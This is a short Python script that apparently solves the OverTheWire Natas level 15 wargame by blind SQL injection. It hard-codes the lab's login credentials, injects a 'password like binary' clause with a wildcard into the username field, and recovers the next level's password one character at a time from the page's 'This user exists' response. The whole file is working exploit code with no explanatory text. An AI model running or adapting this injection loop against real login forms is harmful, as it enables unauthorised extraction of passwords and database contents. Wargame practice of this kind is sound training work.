#!/usr/bin/python3
import requests
import sys
from string import ascii_lowercase , ascii_uppercase , digits

url = "http://natas15.natas.labs.overthewire.org/"
payload = 'natas16" and password like binary "'
charset = ascii_lowercase + ascii_uppercase + digits

s = requests.Session()
s.auth = ('natas15','AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J')

password = ""
while len(password) < 32:
    for char in charset:
        r = s.post(url, data = {'username':payload + password + char + "%"})
        if "This user exists" in r.text:
            sys.stdout.write(char)
            sys.stdout.flush()
            password +=char
            break

